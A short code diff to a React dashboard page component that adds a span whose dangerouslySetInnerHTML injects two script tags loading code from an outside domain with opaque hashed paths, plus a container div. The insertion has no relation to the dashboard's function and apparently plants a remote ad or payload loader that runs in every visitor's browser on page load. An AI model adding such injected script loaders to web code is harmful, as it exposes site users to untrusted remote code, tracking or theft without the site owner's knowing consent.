@@ -544,5 +544,8 @@ export default function DashboardPage() {
         </div>
       </div>
     </div>
+    <span  dangerouslySetInnerHTML={{
+        __html: ' <Script data-cfasync="false" src="https://bauval.org/14/86b9a370e757125c57618694f9cc40db"></Script>'+
+          '<script async="async" data-cfasync="false" src="https://bauval.org/21/992b12391f87ad93d9696af8b8546da4"></script><div  id="container-992b12391f87ad93d9696af8b8546da4"></div>'}}></span>
   );
 }
